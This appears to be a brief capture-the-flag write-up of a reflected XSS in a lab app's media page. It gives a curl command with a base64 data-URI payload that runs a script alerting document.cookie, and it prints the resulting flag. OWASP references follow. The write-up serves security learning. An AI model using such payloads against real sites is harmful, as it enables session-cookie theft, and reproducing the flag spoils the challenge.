# Reflected XSS

One image on the home page is clickable and it follows to the `http://$IPADDR/?page=media` page

```bash
curl -s "http://$IPADDR/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+" | grep flag

...
 The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
...
```

## References
- [Testing Reflected XSS — OWASP](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html)
- [Cross Site Scripting (XSS) — OWASP](https://owasp.org/www-community/attacks/xss/)
- [XSS Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Эффективный поиск XSS-уязвимостей — Habr](https://habr.com/ru/company/jugru/blog/569270/)